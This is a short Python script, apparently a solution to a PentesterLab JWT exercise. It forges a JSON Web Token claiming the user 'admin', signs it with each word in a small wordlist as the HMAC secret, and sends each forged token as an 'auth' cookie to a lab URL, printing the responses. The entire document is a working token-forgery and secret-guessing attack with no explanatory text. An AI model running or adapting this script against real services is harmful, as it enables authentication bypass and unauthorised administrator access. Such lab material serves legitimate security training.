import hmac
import base64
import hashlib
import requests

wordlist = ['hacket', 'jwt', 'insecurity', 'pentesterlab', 'hacking']
url = 'http://ptl-87622861-31599d3f.libcurl.so/'
str = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ'

for word in wordlist:
    sig = base64.urlsafe_b64encode(hmac.new(bytes(word, encoding='utf8'),str.encode('utf-8'),hashlib.sha256).digest()).decode('UTF-8').rstrip("=")
    jwt = str + '.' + sig
    cookies = {'auth' : jwt}
    r = requests.get(url, cookies=cookies)
    print(r.text)

